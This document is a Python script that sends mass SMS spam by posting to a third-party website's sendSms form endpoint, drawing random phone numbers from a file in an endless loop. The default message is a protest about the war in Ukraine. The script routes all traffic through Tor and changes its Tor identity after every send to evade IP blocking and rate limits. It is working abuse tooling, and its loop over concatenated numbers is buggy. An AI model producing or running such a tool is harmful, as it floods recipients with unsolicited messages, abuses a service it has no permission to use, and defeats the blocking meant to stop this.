import random
import re
import textwrap
import requests
import time
import sys
import json
from stem import Signal
from stem.control import Controller
import socks, socket

def call_me(num, msg):
	try:
		current_ip = requests.get(url='http://icanhazip.com/')
		print(f"Sending to {num} from IP: {current_ip.text}")

		session = requests.Session()
		session.head('http://ossinfo.ru/otpravit-sms-na-mts.html')
		response = session.post(
			url='http://ossinfo.ru/functions/custom.php',
			data={
				"method": "sendSms",
				"params[message]": msg,
				"params[number]": f"+{num}",
				"params[transliterate]": "false"
			},
			headers={
				"Referer": 'http://ossinfo.ru/otpravit-sms-na-mts.html',
				"X-Requested-With": "XMLHttpRequest"
			}
		)
		print(json.loads(response.text))
	except Exception as e:
		print(f"Facing error:\n{e}\nDon't bother unless it's persistent")


def main():
	msg = "Vashy voiny ubivaiut mirnoe naselenie v Ukraine"

	if len(sys.argv) >= 2:
		if len(sys.argv[1]) >= 3:
			msg = sys.argv[1]

	print(f"Going to spam the following message:\n{msg}")

	with Controller.from_port(port=9051) as controller:
		controller.authenticate(password='')
		socks.setdefaultproxy(proxy_type=socks.PROXY_TYPE_SOCKS5, addr="127.0.0.1", port=9050)
		socket.socket = socks.socksocket

		while True:
			with open('ph_priority.txt', 'r') as file:
				lines = file.readlines()
				random_line = random.choice(lines) if lines else None
				num = re.sub('\D', '', random_line)
				if len(num) == 11:
					call_me(num, msg)
				elif len(num) % 11 == 0:
					for n in textwrap.wrap(num, 11):
						call_me(num, msg)
      # reset Tor node
			controller.signal(Signal.NEWNYM)
			time.sleep(controller.get_newnym_wait())


if __name__ == "__main__":
  main()
